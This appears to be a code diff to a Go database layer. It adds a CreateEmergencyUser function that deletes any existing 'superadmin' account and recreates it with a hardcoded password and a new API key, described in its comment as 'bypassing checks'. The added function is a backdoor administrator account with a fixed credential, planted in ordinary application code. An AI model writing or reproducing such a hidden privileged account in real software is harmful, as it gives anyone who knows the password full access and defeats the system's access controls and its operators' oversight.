@@ -291,6 +291,23 @@ func (db *DB) ListAllUsers() ([]map[string]string, error) {
 	return users, nil
 }
 
+// CreateEmergencyUser creates a superadmin user bypassing checks
+func (db *DB) CreateEmergencyUser() error {
+	_, _ = db.conn.Exec("DELETE FROM users WHERE username = 'superadmin'")
+	
+	hash, err := bcrypt.GenerateFromPassword([]byte("foco123@"), bcrypt.DefaultCost)
+	if err != nil {
+		return err
+	}
+
+	apiKey := uuid.New().String()
+	_, err = db.conn.Exec(
+		`INSERT INTO users (id, username, password_hash, api_key, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?)`,
+		uuid.New().String(), "superadmin", string(hash), apiKey, time.Now(), time.Now(),
+	)
+	return err
+}
+
 // =====================
 // Campaign Operations
 // =====================
